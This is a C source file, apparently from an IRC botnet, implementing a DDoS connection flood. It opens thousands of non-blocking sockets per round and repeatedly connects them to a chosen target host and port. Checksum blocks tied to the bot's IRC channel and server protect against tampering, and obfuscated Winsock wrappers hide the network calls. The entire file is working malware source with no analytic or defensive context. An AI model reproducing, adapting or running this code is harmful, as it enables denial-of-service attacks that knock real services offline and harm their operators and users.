#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
DWORD WINAPI DdosCondis(LPVOID)
{
    char cTargetHost[MAX_PATH];
    strcpy(cTargetHost, cFloodHost);

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s@%s:%i", cChannel, cServer, usPort);
    char *cStr = cCheckString;
    unsigned long ulCheck = (360527*3)/201;
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum7)
        strcpy(cTargetHost, cServer);
    // <!-------! CRC AREA STOP !-------!>

    unsigned short usTargetPort = usFloodPort;

    SOCKADDR_IN sck;
    memset(&sck, 0, sizeof(sck));

    HOSTENT *paddr;

    for(unsigned short us = 0; us < 25; us++)
    {
        paddr = fncgethostbyname(cTargetHost);
        if(paddr != NULL)
            break;

        Sleep(100);
    }

    sck.sin_addr = (*(in_addr*)*paddr->h_addr_list);

    sck.sin_port = fnchtons(usTargetPort);
    sck.sin_family = AF_INET;

    unsigned short usDelay = 500;

    DWORD dwMode = 1;

    while(bDdosBusy)
    {
        unsigned short usSocketCount = GetRandNum(5000) + 2500;
        SOCKET sSock[usSocketCount];

        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(!bDdosBusy)
                break;

            sSock[us] = fncsocket(AF_INET, SOCK_STREAM, NULL);

            if(sSock[us] == INVALID_SOCKET)
                continue;

            fncioctlsocket(sSock[us], FIONBIO, &dwMode);
        }

        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(!bDdosBusy)
                break;

            if(fncconnect(sSock[us], (SOCKADDR*)&sck, sizeof(sck)))
                dwSockPackets++;
        }

        Sleep(GetRandNum(usDelay) + (usDelay / 2));

        for(unsigned short us = 0; us < usSocketCount; us++)
            fncclosesocket(sSock[us]);

        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s@%s:%i", cChannel, cServer, usPort);
        char *cStr = cCheckString;
        unsigned long ulCheck = (360527*3)/201;
        int nCheck;
        while((nCheck = *cStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
        if(ulCheck != ulChecksum7)
            break;
        // <!-------! CRC AREA STOP !-------!>
    }
    return 1;
}
#endif
